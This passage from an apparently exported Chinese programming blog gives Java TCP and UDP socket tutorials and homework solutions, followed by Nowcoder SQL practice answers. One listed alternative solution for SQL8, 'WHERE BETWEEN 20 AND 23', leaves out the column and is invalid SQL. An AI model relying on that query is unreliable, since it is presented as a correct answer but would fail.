com.jwt.socket;\n\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.Socket;\n\npublic class TCPFileUploadClient {\n    public static void main(String[] args) throws Exception {\n        //1.客户端连接服务端8888，得到Socket 对象\n        Socket socket = new Socket(InetAddress.getLocalHost(), 8888);\n        //2.创建读取磁盘文件的输入流\n        System.out.println(\"客户端开始发送图片\");\n        String filePath = \"/Users/jianjian/Downloads/a.jpeg\";\n        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(filePath));\n        //bytes 就是filePath 对应的字节数组\n        byte[] bytes = StreamUtils.streamToByteArray(bis);\n        //3.通过socket 获取到输出流, 将bytes 数据发送给服务端\n        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());\n        bos.write(bytes);\n        bos.flush();\n        socket.shutdownOutput();//设置写入数据的结束标记\n        System.out.println(\"客户端发送图片成功\");\n        //4.接收从服务端回复的消息\n        InputStream inputStream = socket.getInputStream();\n        //使用StreamUtils 的方法，直接将inputStream 读取到的内容转成字符串\n        String s = StreamUtils.streamToString(inputStream);\n        System.out.println(s);\n        //5.关闭相关的流\n        inputStream.close();\n        bos.close();\n      \tbis.close();\n        socket.close();\n        System.out.println(\"客户端退出.....\");\n    }\n}\n/**\n客户端开始发送图片\n客户端发送图片成功\n服务端：收到图片\n\n客户端退出.....\n**/\n```\n\n##  UDP编程\n\n### 简介\n\n1. 类 DatagramSocket 和 DatagramPacket [数据包/数据报]实现了基于 UDP 协议网络程序。\n2. UDP 数据报通过数据报套接字 DatagramSocket 发送和接收，系统不保证 UDP 数据报一定能够安全送到目的地，也不能确定什么时候可以抵达。\n3. DatagramPacket 对象封装了 UDP 数据报，在数据报中包含了发送端的IP地址和端口号以及接收端的IP地址和端口号。\n4. UDP协议中每个数据报都给出了完整的地址信息，因此无须建立发送方和接收方的连接\n\n### 流程\n\nUDP，以数据报作为数据的传输载体，在进行传输时首先要把传输的数据定义成数据报(Datagram)，在数据报中指明数据要到达的Socket(主机地址和端口号)，然后再将数据以数据报的形式发送出去，然后就没有然后了，服务端收不收到我就不知道了，除非服务端收到后又给我回一段确认的数据报。\n\n#### 接收端编写\n\n- **Step 1**：创建DatagramSocket，指定端口号\n  - DatagramSocket socket = new DatagramSocket(9999);\n\n- **Step 2**：创建DatagramPacket\n  - DatagramPacket packet = new DatagramPacket(buf,buf.length);\n\n- **Step 3**：接收发送端发送的数据信息\n  - socket.receive(packet);\n\n- **Step 4**：读取数据\n  - packet.getLength();\n  - packet.getData();\n\n- **Step 5**：关闭相关资源\n  - socket.close();\n\n\n#### 发送端编写\n\n- **Step 1**：定义发送信息\n  - byte[] data = \"发送端：hello 明天吃火锅~\".getBytes();\n\n- **Step 2**：创建DatagramPacket，包含将要发送的信息\n  - DatagramPacket packet = new DatagramPacket(data, data.length, InetAddress.getByName(\"jianjian\"), 9999);\n\n- **Step 3**：创建DatagramSocket\n  - DatagramSocket socket = new DatagramSocket(9998);\n\n- **Step 4**：发送数据\n  - socket.send(packet);\n\n- **Step 5**：关闭相关资源\n  - socket.close();\n\n\n### 例子：接受端发送端通信\n\n- 1.编写一个接收端 A 和一个发送端 B\n- 2.接收端 A 在 9999 端口等待接收数据\n- 3.发送端 B 向接收端 A 发送数据\"hello ,明天吃火锅~\"\n- 4.接收端 A 接收到发送端 B 发送的数据，回复\"好的，明天见\"，再退出\n- 5.发送端接收回复的数据，再退出\n\n#### 接受端\n\n```java\npackage com.jwt.socket;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPReceiverA {\n    public static void main(String[] args) throws IOException {\n        //1. 创建一个DatagramSocket 对象，准备在9999 接收数据\n        DatagramSocket socket = new DatagramSocket(9999);\n        //2. 构建一个DatagramPacket 对象，准备接收数据\n        // 一个UDP数据包最大64k\n        byte[] buf = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buf,buf.length);\n        System.out.println(\"接收端A等待接收数据..\");\n        //3. 调用接收方法, 将通过网络传输的DatagramPacket 对象,填充到packet 对象\n        //当有数据包发送到本机的9999 端口时，就会接收到数据\n        // 如果没有数据包发送到本机的9999 端口, 就会阻塞等待.\n        socket.receive(packet);\n        //4. 把packet进行拆包，取出数据，并显示\n        int length = packet.getLength();\n        byte[] data = packet.getData();\n        String s = new String(data, 0, length);\n        System.out.println(s);\n        //5. 回复信息给B端,将需要发送的数据，封装到DatagramPacket 对象\n        data = \"接收端：好的, 明天见\".getBytes();\n        //内容字节数组, 数组长度,主机(IP),端口\n        packet = new DatagramPacket(data, data.length, InetAddress.getByName(\"jianjian\"), 9998);\n        socket.send(packet);\n        //6. 关闭资源\n        socket.close();\n        System.out.println(\"A 端退出...\");\n    }\n}\n/**\n接收端A等待接收数据..\n发送端：hello 明天吃火锅~\nA 端退出...\n**/\n```\n\n#### 发送端\n\n```java\npackage com.jwt.socket;\n\nimport java.io.IOException;\nimport java.net.*;\n\npublic class UDPSenderB {\n    public static void main(String[] args) throws IOException {\n        //1.创建DatagramSocket 对象，准备在9998 端口接收数据\n        DatagramSocket socket = new DatagramSocket(9998);\n        //2. 将需要发送的数据，封装到DatagramPacket 对象\n        byte[] data = \"发送端：hello 明天吃火锅~\".getBytes();\n        DatagramPacket packet = new DatagramPacket(data, data.length, InetAddress.getByName(\"jianjian\"), 9999);\n        socket.send(packet);\n        //3. 接收从A 端回复的信息\n        //(1).构建一个DatagramPacket 对象，准备接收数据\n        byte[] buf = new byte[1024];\n        packet = new DatagramPacket(buf, buf.length);\n        //(2) 调用接收方法, 将通过网络传输的DatagramPacket 对象,填充到packet 对象\n        socket.receive(packet);\n        //(3) 可以把packet 进行拆包，取出数据，并显示.\n        int length = packet.getLength();//实际接收到的数据字节长度\n        data = packet.getData();//接收到数据\n        String s = new String(data, 0, length);\n        System.out.println(s);\n        //4. 关闭资源\n        socket.close();\n        System.out.println(\"B 端退出\");\n    }\n}\n/**\n接收端：好的, 明天见\nB 端退出\n**/\n```\n\n## 本章练习\n\n### 1.编程题Homework01.java\n\n- (1)使用字符流的方式，编写一个客户端程序和服务器端程序\n- (2)客户端发送\"name\",服务器端接收到后，返回\"我是nova”，nova 是你自己的名字\n- (3)客户端发送\"hobby\",服务器端接收到后，返回\"编写java程序\"\n- (4)不是这两个问题，回复\"你说啥呢\"\n- 问题:目前，我们只能问一次，就退出了，怎么可以问多次? ->while ->聊天\n\n#### 服务端\n\n```java\npackage com.jwt.socket.homework;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class Homework01Server {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(9999);\n        System.out.println(\"我是服务端，正在监听9999端口，等待连接...\");\n        Socket socket = serverSocket.accept();\n        BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String s = br.readLine();\n        System.out.println(s);\n        \n        String answer = \"\";\n        if (\"name\".equals(s)) {\n            answer = \"我是nova\";\n        } else if(\"hobby\".equals(s)) {\n            answer = \"编写java程序\";\n        } else {\n            answer = \"你说啥呢\";\n        }\n\n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        bw.write(answer);\n        bw.flush();\n        socket.shutdownOutput();\n\n        bw.close();\n        br.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"服务端退出.....\");\n    }\n}\n```\n\n#### 客户端\n\n```java\npackage com.jwt.socket.homework;\n\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class Homework01Client {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(InetAddress.getByName(\"jianjian\"),9999);\n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        //从键盘读取用户的问题\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"请输入你的问题:\");\n        String question = scanner.next();\n        bw.write(question);\n        bw.flush();\n        socket.shutdownOutput();\n\n        BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String s = br.readLine();\n        System.out.println(s);\n\n        br.close();\n        bw.close();\n        socket.close();\n        System.out.println(\"客户端退出.....\");\n    }\n}\n```\n\n### 2.编程题Homework02.java\n\n- (1)编写一个接收端A和一个发送端B,使用UDP协议完成\n- (2)接收端在8888端口等待接收数据\n- (3)发送端向接收端发送数据\"四大名著是哪些\"\n- (4)接收端接收到发送端发送的问题后，返回\"四大名著是<<红楼梦>> ..”，否则返回what?\n- (5)接收端和发送端程序退出\n\n#### 接受端\n\n```java\npackage com.jwt.socket.homework;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class Homework02ReceiverA {\n    //- (1)编写一个接收端A和一个发送端B,使用UDP协议完成\n    //- (2)接收端在8888端口等待接收数据\n    //- (3)发送端向接收端发送数据\"四大名著是哪些\"\n    //- (4)接收端接收到发送端发送的问题后，返回\"四大名著是<<红楼梦>> ..”，否则返回what?\n    //- (5)接收端和发送端程序退出\n\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket(8888);\n        byte[] buf = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buf,0,buf.length);\n        System.out.println(\"接收端A等待接收数据..\");\n        socket.receive(packet);\n        int length = packet.getLength();\n        byte[] data = packet.getData();\n        String s = new String(data,0,length);\n        System.out.println(s);\n\n        String anser = \"\";\n        if(\"四大名著是哪些\".equals(s)){\n            anser = \"四大名著是<<红楼梦>>...\";\n        } else {\n            anser = \"What?\";\n        }\n\n        buf = anser.getBytes();\n\n\n        packet = new DatagramPacket(buf, buf.length, InetAddress.getByName(\"jianjian\"), 9999);\n        socket.send(packet);\n\n        socket.close();\n        System.out.println(\"A 端退出\");\n\n\n\n\n    }\n}\n```\n\n#### 发送端\n\n```java\npackage com.jwt.socket.homework;\n\nimport java.io.IOException;\nimport java.net.*;\nimport java.util.Scanner;\n\npublic class Homework02SenderB {\n    //- (1)编写一个接收端A和一个发送端B,使用UDP协议完成\n    //- (2)接收端在8888端口等待接收数据\n    //- (3)发送端向接收端发送数据\"四大名著是哪些\"\n    //- (4)接收端接收到发送端发送的问题后，返回\"四大名著是<<红楼梦>> ..”，否则返回what?\n    //- (5)接收端和发送端程序退出\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket(9999);\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"请输入你的问题:\");\n        String question = scanner.next();\n        byte[] buf = question.getBytes();\n        DatagramPacket packet = new DatagramPacket(buf, buf.length, InetAddress.getByName(\"jianjian\"), 8888);\n        socket.send(packet);\n\n        buf = new byte[1024];\n        packet = new DatagramPacket(buf, buf.length);\n        socket.receive(packet);\n\n        int length = packet.getLength();\n        byte[] data = packet.getData();\n        String s = new String(data, 0, length);\n        System.out.println(s);\n\n        socket.close();\n        System.out.println(\"B 端退出\");\n    }\n}\n```\n\n### 3.编程题Homework03.java\n\n- (1)编写客户端程序和服务器端程序\n- (2)客户端可以输入一个音乐文件名，比如高山流水，服务端收到音乐名后，可以给客户端返回这个音乐文件，如果服务器没有这个文件，返回一个默认的音乐即可\n- (3)客户端收到文件后，保存到本地 \n- (4)提示:该程序可以使用StreamUtils.java\n- 本质:其实就是指定下载文件的应用先自己结合老师讲的文件上传来做\n\n#### 服务端\n\n```java\npackage com.jwt.socket.homework;\n\nimport com.jwt.socket.StreamUtils;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class Homework03Server {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(9999);\n        System.out.println(\"服务端监听9999端口....\");\n        Socket socket = serverSocket.accept();\n        BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String s = br.readLine();\n        System.out.println(s);\n        //发送音乐\n        System.out.println(\"服务端开始发送音乐\");\n        String music = \"\";\n        if (\"高山流水\".equals(s)){\n            music = \"高山流水.mp3\";\n        } else {\n            music = \"无名.mp3\";\n        }\n        String filePath = \"src//\" + music;\n        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(filePath));\n        byte[] bytes = StreamUtils.streamToByteArray(bis);\n\n        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());\n        bos.write(bytes);\n        bos.flush();\n        socket.shutdownOutput();//设置写入数据的结束标记\n        System.out.println(\"客户端发送音乐成功\");\n\n        bos.close();\n        bis.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"服务端退出...\");\n    }\n}\n```\n\n#### 客户端\n\n```java\npackage com.jwt.socket.homework;\n\nimport com.jwt.socket.StreamUtils;\n\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class Homework03Client {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(InetAddress.getLocalHost(), 9999);\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"输入音乐名：\");\n        String downMusic = scanner.next();\n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        bw.write(downMusic);\n        bw.flush();\n        socket.shutdownOutput();\n        //读取客户端发送的数据,通过Socket 得到输入流\n        System.out.println(\"客户端开始接收音乐\");\n        BufferedInputStream bis = new BufferedInputStream(socket.getInputStream());\n        byte[] bytes = StreamUtils.streamToByteArray(bis);\n        // 将得到bytes 数组，写入到指定的路径，就得到一个文件了\n        String destFilePath = \"/Users/jianjian/Downloads/\" + downMusic + \".mp3\";\n        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(destFilePath));\n        bos.write(bytes);\n        bos.flush();\n        System.out.println(\"客户端接收音乐成功\");\n\n        bos.close();\n        bis.close();\n        bw.close();\n        socket.close();\n        System.out.println(\"客户端退出...\");\n    }\n}\n```\n\n##  ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["网络编程"],"categories":["JavaSE"]},{"title":"牛客-SQL练习","url":"/posts/36625.html","content":"\n## 小简计划\n\n- 入门篇：【题数：39道题】【难度：🌟🌟｜ 用时：3☀️】    \n- 必会篇：【题数：50道题】【难度：🌟｜用时：3☀️】      \n- 进阶篇：【题数：46道题】【难度：🌟🌟🌟｜用时：7☀️】     \n- 真题篇：【题数：39道题】【难度：🌟🌟🌟｜用时：7☀️】\n\n## 一、SQL入门篇\n\n- [x] 🌟入门篇：39道题\n- [x] 🕸题目地址：[牛客网](https://www.nowcoder.com/exam/oj?tab=SQL篇&topicId=199)\n- [x] 🚩小简计划：预计3天写完\n- [x] 🎯开始时间：02-28  完成15道、03-01 完成13道、03-02 完成11道\n- [x] 🎉结束时间：03-02 按时完成🥳\n\n### 01-基础查询\n\n####  SQL1 查询多列\n\n题目地址：[查询多列_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/499b6d01eae342b2aaeaf4d0da61cab0?tpId=199&tqId=1971218&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解：\n\n```sql\nSELECT device_id,gender,age,university FROM user_profile\n```\n\n#### **SQL2** **查询所有列**\n\n题目地址：[查询所有列_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/f9f82607cac44099a77154a80266234a?tpId=199&tqId=1971219&ru=/practice/499b6d01eae342b2aaeaf4d0da61cab0&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT * FROM user_profile\n```\n\n#### **SQL3** **查询结果去重-DISTINCT**\n\n题目地址：[查询结果去重_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/82ebd89f12cf48efba0fecb392e193dd?tpId=199&tqId=1971234&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解1：\n\n```sql\nSELECT DISTINCT university FROM user_profile\n```\n\n题解2：\n\n```sql\nSELECT university FROM user_profile GROUP BY university\n```\n\n#### **SQL4** **查询结果限制返回行数-LIMIT**\n\n题目地址：[查询结果限制返回行数_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/c7ad0e2df4f647dfa5278e99894a7561?tpId=199&tqId=1971238&ru=/practice/82ebd89f12cf48efba0fecb392e193dd&qru=/ta/sql-quick-study/question-ranking)\n\n题解1：\n\n```sql\nSELECT device_id FROM user_profile LIMIT 2\n```\n\n题解2：\n\n```sql\nSELECT device_id FROM user_profile LIMIT 0,2\n```\n\n- LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。\n\n- LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。\n  - 如果只给定一个参数，它表示返回最大的记录行数目。\n  - 如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。\n  - 为了检索从某一个偏移量到记录集的结束所有的记录行，可以指定第二个参数为 -1。\n- 初始记录行的偏移量是 0(而不是 1)。\n\n#### **SQL5** **将查询后的列重新命名-AS**\n\n题目地址：[将查询后的列重新命名_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/0d8f49aeaf7a4e1cb7fecec980712113?tpId=199&tqId=1971243&ru=/practice/c7ad0e2df4f647dfa5278e99894a7561&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT device_id AS user_infos_example FROM user_profile LIMIT 2\n```\n\n### 02-条件查询\n\n#### SQL36 查找后排序-ASC\n\n题目地址：[查找后排序_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/cd4c5f3a64b4411eb4810e28afed6f54?tpId=199&tqId=2002632&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解：\n\n```sql\nSELECT device_id,age FROM user_profile ORDER BY age ASC\n```\n\n- 升序（ASC）\n- 降序（DESC）\n\n#### SQL37 查找后多列排序-ORDER BY\n\n题目地址：[查找后多列排序_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/39f74706f8d94d37865a82ffb7ba67d3?tpId=199&tqId=2002632&ru=%2Fexam%2Foj&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解：\n\n```sql\nSELECT device_id,gpa,age FROM user_profile ORDER BY gpa ASC,age ASC\n```\n\n#### SQL38 查找后降序排列-DESC\n\n题目地址：\n\n题解：\n\n```sql\nSELECT device_id,gpa,age FROM user_profile ORDER BY gpa DESC,age DESC\n```\n\n#### SQL6 查找学校是北大的学生信息-=\n\n题目地址：[查找学校是北大的学生信息_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/7858f3e234bc4d85b81b9a6c3926f49f?tpId=199&tqId=1971248&ru=/practice/d023ae0191e0414ca1b19451099a39f1&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT device_id,university FROM user_profile WHERE university=\"北京大学\"\n```\n\n#### SQL7 查找年龄大于24岁的用户信息->\n\n题目地址：[查找年龄大于24岁的用户信息_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/2ae16bf2fd54415f99344e6024470d57?tpId=199&tqId=1971248&ru=%2Fpractice%2Fd023ae0191e0414ca1b19451099a39f1&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking)\n\n题解：\n\n```sql\nSELECT device_id,gender,age,university FROM user_profile WHERE age > 24\n```\n\n#### SQL8 查找某个年龄段的用户信息-BETWEEN AND\n\n题目地址：[查找某个年龄段的用户信息_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/be54223075cc43ceb20e4ce8a8e3e340?tpId=199&tqId=1971248&ru=%2Fpractice%2Fd023ae0191e0414ca1b19451099a39f1&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking)\n\n题解1：\n\n```sql\nSELECT device_id,gender,age FROM user_profile WHERE age>=20 AND age<=23\n```\n\n题解2：\n\n```sql\nSELECT device_id,gender,age FROM user_profile WHERE BETWEEN 20 AND 23\n```\n\n#### SQL9 查找除复旦大学的用户信息-NOT IN\n\n题目地址：[查找除复旦大学的用户信息_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/c12a056497404d1ea782308a7b821f9c?tpId=199&tqId=1971248&ru=%2Fpractice%2Fd023ae0191e0414ca1b19451099a39f1&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking)\n\n题解1：\n\n```sql\nSELECT device_id,gender,age,university FROM user_profile WHERE university NOT IN (\"复旦大学\")\n```\n\n题解2：\n\n```sql\nSELECT device_id,gender,age,university FROM user_profile WHERE university != \"复旦大学\"\n```\n\n#### SQL10 用where过滤空值练习-IS NOT NULL\n\n题目地址：[用where过滤空值练习_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/08c9846a423540319eea4be44e339e35?tpId=199&tqId=1971605&ru=/practice/c12a056497404d1ea782308a7b821f9c&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT device_id,gender,age,university FROM user_profile WHERE age IS NOT NULL\n```\n\n#### SQL11 高级操作符练习(1)-AND\n\n题目地址：[高级操作符练习(1)_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/2d2e37474197488fbdf8f9206f66651c?tpId=199&tqId=1971781&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解：\n\n```sql\nSELECT device_id,gender,age,university,gpa FROM user_profile WHERE gender = 'male' AND gpa > 3.5\n```\n\n#### SQL12 高级操作符练习(2)-OR\n\n题目地址：[高级操作符练习(2）_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/25bcf6924eff417d90c8988f55675122?tpId=199&tqId=1971781&ru=%2Fexam%2Foj&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解：\n\n```sql\nSELECT device_id,gender,age,university,gpa FROM user_profile WHERE university = '北京大学' OR gpa > 3.7\n```\n\n#### SQL13 WHERE IN和NOT IN\n\n题目地址：[Where in 和Not in_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/0355033fc2244cdaa09b2bd6e794c762?tpId=199&tqId=1971781&ru=%2Fexam%2Foj&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解1：\n\n```sql\nSELECT device_id,gender,age,university,gpa FROM user_profile WHERE university IN ('北京大学','复旦大学','山东大学')\n```\n\n题解2：\n\n```sql\nSELECT device_id,gender,age,university,gpa FROM user_profile WHERE university NOT IN ('浙江大学')\n```\n\n#### SQL14 操作符混合运用-OR、AND\n\n题目地址：[操作符混合运用_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/d5ac4c878b63477fa5e5dfcb427d9102?tpId=199&tqId=1975665&ru=%2Fexam%2Foj&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解：\n\n```sql\nSELECT device_id,gender,age,university,gpa FROM user_profile WHERE (university='山东大学' and gpa > 3.5)\nOR (university=\"复旦大学\" and gpa > 3.8)\n```\n\n#### SQL15 查看学校名称中含北京的用户-LIKE\n\n题目地址：[查看学校名称中含北京的用户_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/95d9922b1e2a49de80daa491889969ee?tpId=199&tqId=1975665&ru=%2Fexam%2Foj&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解：\n\n```sql\nSELECT device_id,age,university FROM user_profile WHERE university LIKE \"%北京%\"\n```\n\n- 列名 [NOT] LIKE\n\n- 匹配串中可包含如下四种通配符：\n- _：匹配任意一个字符；\n- %：匹配0个或多个字符；\n- [ ]：匹配[ ]中的任意一个字符(若要比较的字符是连续的，则可以用连字符“-”表 达 )；\n- [^ ]：不匹配[ ]中的任意一个字符。\n\n### 03-高级查询\n\n#### **SQL16** **查找GPA最高值-MAX**\n\n题目地址：[查找GPA最高值_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/4e22fc5dbd16414fb2c7683557a84a4f?tpId=199&tqId=1975668&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解：\n\n```sql\nSELECT MAX(gpa) FROM user_profile WHERE university=\"复旦大学\"\n```\n\n#### SQL17 计算男生人数以及平均GPA-AVG、ROUND、COUNT\n\n题目地址：[计算男生人数以及平均GPA_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/7d9a7b2d6b4241dbb5e5066d7549ca01?tpId=199&tqId=1975669&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解：\n\n```sql\nSELECT COUNT(gender) AS 'male_num',ROUND(AVG(gpa),1) AS 'avg_gpa' FROM user_profile WHERE gender=\"male\"\n```\n\n- 此题要注意的是暗含条件，保留一位小数\n- 使用ROUND()函数，ROUND返回一个数值，舍入到指定的长度或精度\n\n#### SQL18 分组计算练习题-GROUP BY\n\n题目地址：[分组计算练习题_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/009d8067d2df47fea429afe2e7b9de45?tpId=199&tqId=1975670&ru=/practice/7d9a7b2d6b4241dbb5e5066d7549ca01&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT gender,university,COUNT(device_id) AS 'user_num',AVG(active_days_within_30) AS 'avg_active_day',AVG(question_cnt) AS 'avg_question_cnt' FROM user_profile GROUP BY gender,university \n```\n\n#### SQL19 分组过滤练习题-HAVING\n\n题目地址：[分组过滤练习题_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/ddbcedcd9600403296038ee44a172f2d?tpId=199&tqId=1975671&ru=/practice/009d8067d2df47fea429afe2e7b9de45&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT university,AVG(question_cnt) AS 'avg_question_cnt',AVG(answer_cnt) AS 'avg_answer_cnt' FROM user_profile GROUP BY university HAVING avg_question_cnt < 5 OR avg_answer_cnt < 20 \n```\n\n- `HAVING`子句来指定一组行或聚合的过滤条件。\n\n- `HAVING`子句通常与 GROUP BY 子句一起使用\n\n#### SQL20 分组排序练习题-ORDER BY\n\n题目地址：[分组排序练习题_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/e00bbac732cb4b6bbc62a52b930cb15e?tpId=199&tqId=1975672&ru=/practice/ddbcedcd9600403296038ee44a172f2d&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT university,AVG(question_cnt) AS avg_question_cnt FROM user_profile GROUP BY university ORDER BY avg_question_cnt ASC\n```\n\n### 04-多表查询\n\n#### SQL21 浙江大学用户题目回答情况-WHERE IN\n\n题目地址：[浙江大学用户题目回答情况_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/55f3d94c3f4d47b69833b335867c06c1?tpId=199&tqId=1975673&ru=/practice/55f3d94c3f4d47b69833b335867c06c1&qru=/ta/sql-quick-study/question-ranking)\n\n题解1：\n\n```sql\nSELECT device_id,question_id,result FROM question_practice_detail WHERE device_id \nIN (SELECT device_id FROM user_profile WHERE university='浙江大学')\n```\n\n题解2：\n\n```sql\nSELECT t1.device_id, t1.question_id, t1.result\nFROM question_practice_detail AS t1\nINNER JOIN user_profile AS t2\nON t2.device_id = t1.device_id AND t2.university='浙江大学'\n```\n\n#### SQL22 统计每个学校的答过题的用户的平均答题数-INNER IN\n\n题目地址：[统计每个学校的答过题的用户的平均答题数_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/88aa923a9a674253b861a8fa56bac8e5?tpId=199&tqId=1975674&ru=/practice/55f3d94c3f4d47b69833b335867c06c1&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT t1.university, ROUND(COUNT(t2.question_id)/ COUNT(DISTINCT t2.device_id),4)AS avg_answer_cnt\nFROM question_practice_detail AS t2\nINNER JOIN user_profile as t1\nON t1.device_id = t2.device_id\nGROUP BY university\nORDER BY university ASC\n```\n\n#### SQL23 统计每个学校各难度的用户平均刷题数-LEFT JOIN\n\n题目地址：[统计每个学校各难度的用户平均刷题数_牛客题霸_牛客网 